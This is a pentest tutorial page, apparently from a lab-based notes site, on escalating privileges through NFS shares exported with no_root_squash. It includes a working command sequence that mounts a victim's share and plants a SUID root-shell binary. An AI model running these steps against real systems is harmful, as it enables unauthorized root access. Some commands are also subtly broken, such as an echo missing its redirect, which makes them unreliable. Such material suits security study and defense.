# 👩‍🏫 NFS Root Squashing

## Escalation via NFS Root Squashing

### Introduction

Network File System (NFS) is a distributed file system protocol that allows a client to access files over a network as if they were on its local hard drive. NFS Root Squashing is a security feature that restricts the root user's access on the NFS client, preventing them from having superuser privileges on the NFS server.

<figure><img src="https://1846131522-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MWVjG_njKgBtvmnKaJh%2F-MfpHk6egzwC-0G7wEe4%2F-MfpI1lfqWkXpGpvqWIZ%2Fimage.png?alt=media&#x26;token=2a83441d-9cb1-4746-930e-24c78bd4a461" alt=""><figcaption></figcaption></figure>

### Understanding NFS Root Squashing

When a user on an NFS client attempts to access files on an NFS server, the server checks the user's identity. If the user is the root on the client machine, NFS Root Squashing maps the root user's UID and GID to a non-privileged user's UID and GID on the NFS server. This is done to prevent a compromised or malicious root user on the client from gaining unrestricted access to files on the server.

### Exploiting NFS Root Squashing for Privilege Escalation

If an NFS share is misconfigured with weak permissions or improperly set root squashing, an attacker might find ways to abuse this feature for privilege escalation. Here's a general process an attacker might follow:

1. **Identify NFS Mounts:**
   * Use commands like `showmount -e <NFS_SERVER>` on the attacker's machine to identify NFS shares.
2. **Check Mount Options:**
   * Inspect the mount options on the client. Look for the presence of `no_root_squash` or weak permissions.
3. **Craft Malicious Payloads:**
   * If root squashing is in effect, the attacker can craft payloads that manipulate files within the NFS share.
4. **Exploit Weak Permissions:**
   * If the NFS share has weak permissions, the attacker may be able to create or overwrite files that could lead to privilege escalation.
5. **Abuse Trust Relationships:**
   * If the NFS server trusts the client, the attacker might manipulate files in a way that the server will execute malicious code.

Let's see:

<figure><img src="../../../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

We see "no root squash", that's interesting..

On our attacker machine, we can:

```
root@ip-10-10-16-213:~# showmount -e <Victim_IP>
Export list for <Victim_IP>:
/tmp *
root@ip-10-10-16-213:~# mkdir /tmp/mountme
root@ip-10-10-16-213:~# mount -o rw,vers=2 10.10.230.125:/tmp /tmp/mountme
root@ip-10-10-16-213:~# echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' /tmp/mountme/x.c
int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; } > /tmp/mountme/x.c
root@ip-10-10-16-213:~# cat /tmp/mountme/x.c
int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }
root@ip-10-10-16-213:~# gcc /tmp/mountme/x.c -o /tmp/mountme/malicious
root@ip-10-10-16-213:~# chmod +s /tmp/mountme/malicious
```

and on our victim machine we can now see:

<figure><img src="../../../../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Explanation:

1.  **Show NFS Exports:**

    ```bash
    root@ip-10-10-16-213:~# showmount -e <Victim_IP>
    ```

    The `showmount` command is used to display the NFS (Network File System) exports on the victim machine. It reveals that the `/tmp` directory is exported.
2.  **Create a Mount Point:**

    ```bash
    root@ip-10-10-16-213:~# mkdir /tmp/mountme
    ```

    A local directory (`/tmp/mountme`) is created on the attacking machine to mount the exported directory.
3.  **Mount the NFS Share:**

    ```bash
    root@ip-10-10-16-213:~# mount -o rw,vers=2 10.10.230.125:/tmp /tmp/mountme
    ```

    The `mount` command is used to mount the NFS share from the victim machine (`10.10.230.125:/tmp`) onto the local mount point (`/tmp/mountme`). The options `rw` indicate read and write access, and `vers=2` specifies the NFS version.
4.  **Create a Malicious C Program:**

    ```bash
    root@ip-10-10-16-213:~# echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' /tmp/mountme/x.c
    ```

    A simple C program (`x.c`) is created within the mounted directory that sets the GID and UID to 0 (root) and then executes `/bin/bash`.
5.  **Compile the C Program:**

    ```bash
    root@ip-10-10-16-213:~# gcc /tmp/mountme/x.c -o /tmp/mountme/malicious
    ```

    The `gcc` compiler is used to compile the C program (`x.c`) into a binary executable named `malicious` within the mounted directory.
6.  **Set SUID Bit:**

    ```bash
    root@ip-10-10-16-213:~# chmod +s /tmp/mountme/malicious
    ```

    The SUID bit is set on the compiled binary, allowing it to run with the privileges of the file owner (root). This enables a non-root user to execute the binary with elevated privileges.

After completing these steps, the attacker can execute the compiled `malicious` binary from the local mount point (`/tmp/mountme`), leading to the execution of a root shell on the victim machine:

<figure><img src="../../../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>
